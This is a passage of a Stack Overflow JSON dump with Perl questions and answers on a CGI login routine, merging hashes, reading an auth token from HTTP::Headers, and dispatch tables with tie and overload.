<code>undef</code>, empty or <code>0</code>), run the following lines until end of the <code>if</code> block. <code>=</code> is an assignment in Perl, while <code>==</code> and <code>eq</code> are comparisons. See <a href=\"http://perldoc.perl.org/perlop.html#Equality-Operators\" rel=\"nofollow\">http://perldoc.perl.org/perlop.html#Equality-Operators</a> for more information.</li>\n<li>The better way of reading a file is using <code>while (&lt;FILEHANDLE&gt;) { ... }</code>. Your solution read the full file into memory even if the first line matches the user trying to login. <code>while</code> reads line-by-line until you exit the loop.</li>\n<li>Consider running PerlCritic on your sourcecode. It doesn't check for errors, but shows <em>best practice</em> hints where the Perl community prefers some other way. Don't try to \"fix\" every critic report, but check them to improve your code.</li>\n</ol>\n"}], "owner": {"reputation": 97, "user_id": 4010164, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/6e047ccfef3f6e0119f254d858bb2c12?s=128&d=identicon&r=PG&f=1", "display_name": "Rory Perry", "link": "https://stackoverflow.com/users/4010164/rory-perry"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 128, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1462513828, "creation_date": 1462491846, "question_id": 37062019, "link": "https://stackoverflow.com/questions/37062019/perl-html-basic-login", "title": "Perl/HTML Basic Login", "body": "<p>So I have a University assignment where I must have authenticated users login to edit a text file. I'm trying to contain this all within the one CGI file to keep it easy. </p>\n\n<p>I've written a html form as shown below:</p>\n\n<pre><code>Admin Login: \n&lt;form name=\"login\" method=\"post\" action=\"pbr.cgi\"&gt;&lt;input type=\"text\" name=\"user\" value=\"Username\" onfocus=\"(this.value == 'Username') &amp;&amp; (this.value = '')\"onblur=\"(this.value == '') &amp;&amp; (this.value = 'Username')\"/&gt;  \n&lt;input type=\"password\" name=\"password\" value=\"123456\" onfocus=\"(this.value == '123456') &amp;&amp; (this.value = '')\"onblur=\"(this.value == '') &amp;&amp; (this.value = '123456')\"/&gt;  \n&lt;input class=\"login\" name=\"Login\" type=\"submit\" value=\"Login\"&gt;&lt;/form&gt;\n</code></pre>\n\n<p>I also have a login sub in the cgi as below:</p>\n\n<pre><code>sub Login {\n    $luser = $cgi-&gt;param('user');\n    $lpass = $cgi-&gt;param('password');\n\n    open (PASSWD, \"&lt;passwords.txt\");\n        my @passwds = &lt;PASSWD&gt;;\n        close (PASSWD);\n\n        foreach (@passwds){\n            ($user, $pass, $passsalt) = split \":\";\n            if ($user = $luser){\n                $testpass = $salt . $lpass;\n                $testpass = sha256_hex($testpass);\n                if ($pass = $testpass){\n                    $validuser = 1;\n                } else {\n                    $validuser = 0;\n                }\n\n            } else {\n                print \"Failure!\"\n            }\n        }\n}\n</code></pre>\n\n<p>Can someone explain to me how I get the CGI to recognise the login button has been pressed and subsequently execute the Login sub while reloading the page? Obviously I'll have to set a cookie as well once I get this working but I just want to get it working first.</p>\n"}, {"tags": ["perl", "hash", "concatenation", "hashtable"], "comments": [{"owner": {"reputation": 3604, "user_id": 436450, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0afd75178763cf41af43a103b95277ae?s=128&d=identicon&r=PG", "display_name": "jira", "link": "https://stackoverflow.com/users/436450/jira"}, "edited": false, "score": 0, "creation_date": 1462519249, "post_id": 37061977, "comment_id": 61678670, "body": "Seems to me you want to join two tables and return an array. I don&#39;t see any hash involved in your (very confusing) pseudo code."}, {"owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "reply_to_user": {"reputation": 3604, "user_id": 436450, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0afd75178763cf41af43a103b95277ae?s=128&d=identicon&r=PG", "display_name": "jira", "link": "https://stackoverflow.com/users/436450/jira"}, "edited": false, "score": 0, "creation_date": 1462830840, "post_id": 37061977, "comment_id": 61792911, "body": "Yes, I am open to using Arrays Or Hashes .. the actual goal is to combine them ... the Name would be same in both ..."}], "answers": [{"comments": [{"owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "edited": false, "score": 0, "creation_date": 1462502739, "post_id": 37062039, "comment_id": 61673197, "body": "The actual problem statement is that I need to combine that information .. how to achieve that efficiently .. The hashes are actually 2 different tables from which I would populate the hash. The field Name is the unique thing between two tables... Second table can have the name repeated more than once, so we need to see all the instances, combine them and then put them in the final hash .."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "edited": false, "score": 0, "creation_date": 1462504484, "post_id": 37062039, "comment_id": 61673577, "body": "@Muzammil I&#39;ve assumed <code>%Activity</code> has the name as the key and the activity as the value like <code>$Activity{David} = &quot;A&quot;</code>. There can only be one entry for each name, so no duplicates like you have. But then <code>@Activity{qw[Name]}</code> makes no sense. Could you clear this up by editing your post and writing out the data structures you have in actual Perl code?"}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 2, "last_activity_date": 1462491982, "creation_date": 1462491982, "answer_id": 37062039, "question_id": 37061977, "link": "https://stackoverflow.com/questions/37061977/perl-concatenating-2-hashes-based-on-a-certain-key/37062039#37062039", "title": "Perl Concatenating 2 hashes based on a certain key", "body": "<p>What you want is a hash of hashes.  Conceptually, you'd combine all information about an asset into a single hash.</p>\n\n<pre><code>my %dave = (\n    name          =&gt; \"Dave\",\n    computer_name =&gt; \"X\",\n    activity      =&gt; \"A\"\n);\n</code></pre>\n\n<p>Then this goes into a larger hash of all assets keyed by their name.</p>\n\n<pre><code>$Assets{$dave{name}} = \\%dave;\n</code></pre>\n\n<p>If you want to find Dave's activity...</p>\n\n<pre><code>print $Assets{Dave}{activity};\n</code></pre>\n\n<p>You can pull out all information about Dave and pass it around as a hash reference.</p>\n\n<pre><code> my $dave = $Assets{Dave};\n print $dave-&gt;{activity};\n</code></pre>\n\n<p>This sort of structure inevitably leads to modelling your assets as objects.</p>\n\n<p>You can learn more about hashes of hashes in the <a href=\"http://perldoc.perl.org/perldsc.html\" rel=\"nofollow\">Perl Data Structures Cookbook</a>.</p>\n"}], "owner": {"reputation": 588, "user_id": 1940533, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/9c3fa75cb5aad69bda8770fa335f99d6?s=128&d=identicon&r=PG", "display_name": "Muzammil", "link": "https://stackoverflow.com/users/1940533/muzammil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1462551471, "creation_date": 1462491597, "question_id": 37061977, "link": "https://stackoverflow.com/questions/37061977/perl-concatenating-2-hashes-based-on-a-certain-key", "title": "Perl Concatenating 2 hashes based on a certain key", "body": "<p>Hi I have two hashes %Asset &amp; %Activity</p>\n\n<pre><code>%Asset\nName,Computer Name\nDavid,X\nClark,Y\nSam,Z\n\n%Activity\nName,Activity\nDavid,A\nClark,B\nSam,C\nDavid,D\nClark,E\nSam,F\n</code></pre>\n\n<p>The second hash has the name repeated multiple times (can be more than 2) .. I want to get a hash with the concise infromation.. something like</p>\n\n<pre><code>Name,Computer Name,Activity\nDavid,X,A&amp;D\nClark,Y,B&amp;E\nSam,Z,C&amp;F\n</code></pre>\n\n<p>my idea in a pseudo code kind of way is; </p>\n\n<pre><code>foreach (@Activity{qw[Name]}) {\n    push @Asset{qw[Name Activity]}, $Activity['Activity']\n\n}\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "edited": false, "score": 1, "creation_date": 1462489514, "post_id": 37061674, "comment_id": 61670323, "body": "<code>$VAR1-&gt;{&#39;auth-token&#39;}</code>"}], "answers": [{"tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": true, "score": 4, "last_activity_date": 1462489876, "creation_date": 1462489876, "answer_id": 37061739, "question_id": 37061674, "link": "https://stackoverflow.com/questions/37061674/perl-get-value-of-nested-hash/37061739#37061739", "title": "Perl get value of nested hash", "body": "<p>That's a hash that's been blessed into an <a href=\"https://metacpan.org/pod/HTTP::Headers\" rel=\"nofollow\">HTTP::Headers</a> object. You can access what you need by using its API:</p>\n\n<pre><code>my $token = $VAR1-&gt;header('auth-token');\n</code></pre>\n\n<p>I wouldn't recommend accessing it via the hash directly (breaking encapsulation), in case the internals of <code>HTTP::Headers</code> ever changes.</p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462532401, "post_id": 37061813, "comment_id": 61686321, "body": "I&#39;m not sure &quot;use a hash for objects&quot; is the right way to put it. Pretty fundamentally, a nested hash is chain of references, and so is an object. So they&#39;re essentially the same thing, it&#39;s just an object has methods it gets from a class."}], "tags": [], "owner": {"reputation": 2690, "user_id": 5869736, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b18e361761e0643fd9003f9eae40ba45?s=128&d=identicon&r=PG&f=1", "display_name": "Marty", "link": "https://stackoverflow.com/users/5869736/marty"}, "is_accepted": false, "score": 0, "last_activity_date": 1462490375, "creation_date": 1462490375, "answer_id": 37061813, "question_id": 37061674, "link": "https://stackoverflow.com/questions/37061674/perl-get-value-of-nested-hash/37061813#37061813", "title": "Perl get value of nested hash", "body": "<p>Its common in perl5 to use a hash for objects.  In this case, you have a 'HTTP::Headers' object in $VAR1.  Under the hood, the object is a blessed HashRef, so what your are seeing are the ordinary \"guts\" of a hash.  To the left of the \"fat commas\" are the keys and to the right are the values.</p>\n\n<p>So, your question boils down to - given a hashref in a variable, how do I get the value for key 'x'?  Now, here is how you do that - but DONT do it.</p>\n\n<pre><code>print $VAR1-&gt;{ auth-token };\n</code></pre>\n\n<p>The reason why I say \"dont do it\" is that you're breaking a fundamental principle of OO programming called encapsulation.  The details of the object are not supposed to be any of your business.  Instead use the methods provided by the class (ie, provided by the module <code>HTTP::Headers</code>)</p>\n\n<p>Reading the <a href=\"https://metacpan.org/pod/HTTP::Headers\" rel=\"nofollow\">HTTP::Heders doco</a>, you can get the header for 'auth token' like so;</p>\n\n<pre><code>print $VAR1-&gt;header( 'auth-token' )\n</code></pre>\n\n<p>This is what you need to do.</p>\n"}], "owner": {"reputation": 9140, "user_id": 1007727, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7cb37f072befac0347afe7b51050e23e?s=128&d=identicon&r=PG", "display_name": "Deano", "link": "https://stackoverflow.com/users/1007727/deano"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 219, "favorite_count": 0, "accepted_answer_id": 37061739, "answer_count": 2, "score": 2, "last_activity_date": 1462826655, "creation_date": 1462489413, "question_id": 37061674, "link": "https://stackoverflow.com/questions/37061674/perl-get-value-of-nested-hash", "title": "Perl get value of nested hash", "body": "<p>I have spent couple hours trying to get the value of 'Auth-Token' out of REST api response header, I just don't understand the meaning of bless({ key=> value })\nis this a hashref inside an array? How can I loop through it. </p>\n\n<pre><code> $VAR1 = bless( {\n                     'access-control-allow-credentials' =&gt; 'true',\n                     'connection' =&gt; 'keep-alive',\n                     'x-powered-by' =&gt; 'restheart.org',\n                     'client-response-num' =&gt; 1,\n                     'access-control-allow-origin' =&gt; '*',\n                     'date' =&gt; 'Thu, 05 May 2016 22:54:44 GMT',\n                     'client-peer' =&gt; '172.18.18.122:8080',\n                     'content-length' =&gt; '469',\n                     'access-control-expose-headers' =&gt; 'Location, ETag, Auth-Token, Auth-Token-Valid-Until, Auth-Token-Location, X-Powered-By',\n                     '::std_case' =&gt; {\n                                       'access-control-allow-credentials' =&gt; 'Access-Control-Allow-Credentials',\n                                       'x-powered-by' =&gt; 'X-Powered-By',\n                                       'client-response-num' =&gt; 'Client-Response-Num',\n                                       'access-control-allow-origin' =&gt; 'Access-Control-Allow-Origin',\n                                       'client-peer' =&gt; 'Client-Peer',\n                                       'access-control-expose-headers' =&gt; 'Access-Control-Expose-Headers',\n                                       'client-date' =&gt; 'Client-Date',\n                                       'auth-token-valid-until' =&gt; 'Auth-Token-Valid-Until',\n                                       'auth-token-location' =&gt; 'Auth-Token-Location',\n                                       'auth-token' =&gt; 'Auth-Token'\n                                     },\n                     'client-date' =&gt; 'Thu, 05 May 2016 22:55:00 GMT',\n                     'content-type' =&gt; 'application/hal+json',\n                     'auth-token-valid-until' =&gt; '2016-05-05T23:09:44.471Z',\n                     'auth-token-location' =&gt; '/_authtokens/test',\n                     'auth-token' =&gt; 'fbbb0215-cedd-4a10-9f89-93fdf1e84fdc'\n                   }, 'HTTP::Headers' );\n</code></pre>\n"}, {"tags": ["perl", "data-structures", "hash", "anonymous-function"], "answers": [{"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462550227, "post_id": 37061644, "comment_id": 61698041, "body": "&quot;It calls the sub and returns the value directly when the key is looked up.&quot; Maybe this is what you meant, but the sub is only called once, when the hash is initialized. This probably won&#39;t work if the OP&#39;s subs have side effects (but is obviously much more efficient if there aren&#39;t side effects)."}], "tags": [], "owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "is_accepted": false, "score": 1, "last_activity_date": 1462491079, "last_edit_date": 1462491079, "creation_date": 1462489195, "answer_id": 37061644, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37061644#37061644", "title": "Automatically call hash values that are subroutine references", "body": "<p>You need to identify when a code ref is present, then execute it as an actual call:</p>\n\n<pre><code>foreach my $key (sort keys %hash) {\n    if (ref $hash{$key} eq 'CODE'){\n        print $hash{$key}-&gt;() . \"\\n\";\n    }\n    else {\n        print \"$hash{$key}\\n\";\n    }\n}\n</code></pre>\n\n<p>Note that you may consider making all of the hash values subs (a true dispatch table) instead of having some that return non-coderefs and some that return refs.</p>\n\n<p>However, if you define the hash as such, you don't have to do any special trickery when it comes time to use the hash. It calls the sub and returns the value directly when the key is looked up.</p>\n\n<pre><code>key2 =&gt; sub {\n    return \"value2\";\n}-&gt;(),\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462526852, "post_id": 37061645, "comment_id": 61682870, "body": "Not strictly true. There are ways it can be done. Whether they are a good idea is a different matter..."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462527317, "post_id": 37061645, "comment_id": 61683174, "body": "@Sobrique  Yes, thank you for the comment.  I meant to guard against that by &quot;No, not <i>like this</i>&quot; ... but that was not good enough at all. I thought that OP was about something direct and simple, not injecting layers of code and complexity between his hash and its use. (Also, I don&#39;t know exactly how to do that -- and will read your and Borodin&#39;s answer with pleasure!)  Given where this question went I&#39;ll probably remove this post."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1462553406, "post_id": 37061645, "comment_id": 61699870, "body": "May I suggest you rephrase to &quot;It&#39;s possible, but it requires complicated and obscure code. You might find it simpler and cleaner to use the following approach...&quot;"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1462557667, "post_id": 37061645, "comment_id": 61702180, "body": "@ikegami Thank you for the comment. I wasn&#39;t sure whether this post had a place on this page, given the other answers. But I suppose it <i>is</i> one simple way."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462564860, "post_id": 37061645, "comment_id": 61705776, "body": "I agree with ikegami about the wording. There&#39;s no reason to delete this. It&#39;s actually great when a question gets a whole range of answers, from simple to complex; there&#39;s something for everybody."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462567996, "post_id": 37061645, "comment_id": 61707230, "body": "@ThisSuitIsBlackNot Thank you! I am just unsure sometimes and I don&#39;t like to leave my posts around when do not contribute to the page overall.  Edited the post."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462568182, "post_id": 37061645, "comment_id": 61707312, "body": "@Borodin I&#39;ve added another edit, adding two sentences. If you feel that it somehow distorts yours or that it is out of place please edit or roll back as you find appropriate."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462632683, "post_id": 37061645, "comment_id": 61723679, "body": "@zdim: Hey it&#39;s your question. You can do whatever you like with it! I made the edit in an attempt to help you out with phrasing <i>&quot;not like this&quot;</i> more clearly. You&#39;re always free to roll back any changes that others have made to your post, and you certainly don&#39;t need to check with anyone else before you make changes"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462665523, "post_id": 37061645, "comment_id": 61733376, "body": "@Borodin Yes, I understand that. I appreciate the edit very much and then I also respect it in the sense that I don&#39;t want to stomp on it and possibly change it in a way that distorts etc. Just meant to let you know. Specially in this question, where wording may be tricky. I guess it was an overkill. Thank you for the comment."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 1, "last_activity_date": 1462666611, "last_edit_date": 1462666611, "creation_date": 1462489207, "answer_id": 37061645, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37061645#37061645", "title": "Automatically call hash values that are subroutine references", "body": "<p>No, not without some ancillary code. You are asking for a simple scalar value and a code reference to behave in the same way.  The code that would do that is far from simple and also injects complexity between your hash and its use. You might find the following approach simpler and cleaner.</p>\n\n<p>You can make all values code references, making the hash a <em>dispatch table</em>, for uniform invocation</p>\n\n<pre><code>my %hash = (\n    key1 =&gt; sub { return \"value1\" },\n    key2 =&gt; sub {\n        # carry on some processing ...\n        return \"value2\"; # In the real code, this value can differ\n    },\n);\n\nprint $hash{$_}-&gt;() . \"\\n\" for sort keys %hash;\n</code></pre>\n\n<p>But of course there is a minimal overhead to this approach.</p>\n"}, {"comments": [{"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1462489814, "post_id": 37061673, "comment_id": 61670397, "body": "<a href=\"https://metacpan.org/pod/Variable::Magic\" rel=\"nofollow noreferrer\">Variable::Magic</a> would also work, in a similar fashion to tie, with more complication but also more speed."}], "tags": [], "owner": {"reputation": 19681, "user_id": 936986, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/075f0ea7418371ace9bba5b901409ab1?s=128&d=identicon&r=PG", "display_name": "Oleg V. Volkov", "link": "https://stackoverflow.com/users/936986/oleg-v-volkov"}, "is_accepted": false, "score": 2, "last_activity_date": 1462489403, "creation_date": 1462489403, "answer_id": 37061673, "question_id": 37061561, "link": "https://stackoverflow.com/questions/37061561/automatically-call-hash-values-that-are-subroutine-references/37061673#37061673", "title": "Automatically call hash values that are subroutine references", "body": "<p>Yes you can. You can either <a href=\"http://p3rl.org/perltie\" rel=\"nofollow\"><code>tie</code></a> hash to implementation that will resolve coderefs to their return values or you can use blessed scalars as values with <a href=\"http://p3rl.org/overload\" rel=\"nofollow\"><code>overload</code>ed</a> mehods for stringification, numification and whatever else context you want to resolve automatically.</p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462522240, "post_id": 37061862, "comment_id": 61680242, "body": "I would suggest doing something similar via an object might also work, and not be as evil as tieing."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1462526922, "post_id": 37061862, "comment_id": 61682912, "body": "<i>&quot;and not be as evil as tieing&quot;</i> What is this antipathy towards tying? <i>&quot;doing something similar via an object&quot;</i> will result in a lot more code. The only thing I have against <code>tie</code> is that the code is a lot slower than ordinary Perl access to a variable, as it is written in Perl instead of C. For anything but huge data structures that&#39;s fine"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462528003, "post_id": 37061862, "comment_id": 61683591, "body": "&quot;needlessly complicated and pointlessly obfuscated&quot; See my solution. An extra fifteen lines of code? In a separate module file? And half of that is for some cute initialisation syntax in the calling code.  <i>&quot;As cool as such tricks are, using them in real code would be a mistake at least 99% of the time&quot;</i> I think this is a needlessly disparaging and scaremongering answer. You are clearly unfamiliar with <code>tie</code>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462529555, "post_id": 37061862, "comment_id": 61684660, "body": "I dislike the &#39;action at a distance&#39; element of <code>tie</code> - much like overloading, if done well it&#39;s useful, and if done badly is a road to really horrible code."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1462531487, "post_id": 37061862, "comment_id": 61685829, "body": "@Sobrique: Fine, but citing <i>&quot;action at a distance&quot;</i> is much more useful than assigning a label of <i>&quot;evil&quot;</i>"}, {"owner": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462539546, "post_id": 37061862, "comment_id": 61690686, "body": "@Borodin: I&#39;ve used <code>tie</code> myself <a href=\"https://metacpan.org/pod/Time::Stopwatch\" rel=\"nofollow noreferrer\">once</a> or <a href=\"https://metacpan.org/pod/Tie::CharArray\" rel=\"nofollow noreferrer\">twice</a>, and I do agree that it&#39;s a very useful tool. However, I don&#39;t think it&#39;s a necessary, or even appropriate, tool here; this task is very cleanly, tersely and easily accomplished with a simple helper function as shown above. I don&#39;t believe using <code>tie</code> here can achieve the same level of simplicity and readability. TIMTOWTDI, but there&#39;s no need to choose a fancy and complicated way where a simple elementary one will do."}], "tags": [], "owner": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "is_accepted": false, "score": 5, "last_activity_date": 1462503097, "last_edit_date": 1495540426, "creation_date": 1462490700, "answer_id": 37061862, "question_id": 37061561, "link": 